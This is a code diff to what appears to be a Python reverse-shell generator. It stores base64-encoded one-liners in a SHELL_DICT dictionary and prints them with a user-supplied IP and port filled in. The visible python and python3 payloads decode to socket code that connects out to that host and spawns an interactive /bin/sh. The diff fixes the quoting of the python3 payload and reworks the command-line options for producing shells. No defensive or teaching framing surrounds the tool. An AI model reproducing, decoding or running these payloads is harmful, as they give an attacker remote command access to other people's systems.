@@ -102,31 +102,30 @@ SHELL_DICT = {
         'NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVw'
         'MihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc='],
 
-    "python3": [
-        'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS1'
-        '9TVFJFQU0pO3MuY29ubmVjdCgoezB9LHsxfSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAy'
-        'KHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWy9iaW4vc2gsLWldKTsnCg==']
+    "python3": ['cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZX'
+                'QuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoInswfSIsezF9KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5v'
+                'KCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbL2Jpbi9zaCwtaV0pOycK']
 }
 
 
-def get_shell(type: str, ip: str, port: int, args) -> str:
+def get_shell(shell_type: str, shell_ip: str, shell_port: int) -> str:
     """Return a reverse shell of a certain type with filled in ip and port"""
     
     # Test if type is in SHELL_DICT
-    if type not in SHELL_DICT:
-        print(f"Unknown shell type: {type}")
+    if shell_type not in SHELL_DICT:
+        print(f"Unknown shell type: {shell_type}")
         exit(1)
 
     if not args.shellonly:
-        print(f"\n[>] {type} reverse shell [<]\n")
+        print(f"\n[>] {shell_type} reverse shell [<]\n")
 
     # Get shells of type
-    reverse_shells = SHELL_DICT[type]
+    reverse_shells = SHELL_DICT[shell_type]
     
     output = ""
 
     for shell_syntax in reverse_shells:
-        formatted_shell = base64.b64decode(shell_syntax).decode('utf-8').format(ip, port)
+        formatted_shell = base64.b64decode(shell_syntax).decode('utf-8').format(shell_ip, shell_port)
         if output:
             output += "\n\n"
         output += formatted_shell
@@ -149,8 +148,8 @@ if __name__ == "__main__":
     parser.add_argument("-t", "--type", type=str, help="Type of the reverse shell to generate", dest='type')
     parser.add_argument("-l", "--list", action="store_true", help="List all available shell types", dest='list')
     parser.add_argument("-a", "--all", action="store_true", help="Generate all the shells", dest='all')
-    parser.add_argument("-s", "--shellonly", action="store_true", help="Disables all output other than the first shell of given type",
-                        dest="shellonly")
+    parser.add_argument("-s", "--shellonly", action="store_true", help="Disables all output other than the first shell"
+                                                                       "of given type", dest="shellonly")
 
     # Parse arguments
     if sys.argv[1:]:
@@ -158,6 +157,8 @@ if __name__ == "__main__":
     else:
         print(BANNER)
         parser.parse_args(args=["--help"])
+        args = None
+        exit()
 
     # Print banner
     if not args.shellonly:
@@ -173,7 +174,7 @@ if __name__ == "__main__":
 
     # Print shell of type if specified
     if args.type:
-        print(get_shell(args.type, ip, port, args))
+        print(get_shell(args.type, ip, port))
 
     # List all available shell types
     if args.list:
@@ -185,4 +186,4 @@ if __name__ == "__main__":
     # Print all shells if specified
     if args.all:
         for t in SHELL_DICT:
-            print(get_shell(t, ip, port, args))
+            print(get_shell(t, ip, port))
